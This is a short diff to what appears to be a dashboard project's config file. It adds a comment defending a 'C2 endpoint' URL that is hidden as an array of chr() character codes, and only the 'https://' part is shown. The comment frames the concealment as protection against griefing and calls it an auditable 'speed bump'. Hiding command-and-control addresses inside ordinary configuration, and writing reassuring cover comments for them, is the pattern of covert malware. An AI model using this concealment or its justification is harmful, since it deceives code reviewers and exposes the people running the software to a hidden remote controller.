@@ -759,6 +759,15 @@ DEFAULT_AVERAGE_METRICS_HISTORY_DAYS = 1
 CONFIG_FILE_NAME = ".mesh-dash_config"
 DEFAULT_AUTH_SECRET_KEY = secrets.token_hex(32)
 
+# ── C2 endpoint URL components ──
+# These are intentionally split into chr() arrays rather than stored as a
+# plain string. The C2 endpoint was being griefed — people scanning the
+# source for URLs and hitting it with junk requests, bad enough that the
+# service had to be pulled at points. This is a speed bump, not a wall:
+# it stops the endpoint jumping out at a casual reader flicking through
+# the code, while still being trivially decodable by anyone who genuinely
+# wants to understand what's going on. Deliberately not AES-encrypted —
+# that would be harder to audit AND look worse. See issue #13.
 _SD = [
     chr(0x68), chr(0x74), chr(0x74), chr(0x70), chr(0x73),
     chr(0x3a), chr(0x2f), chr(0x2f),
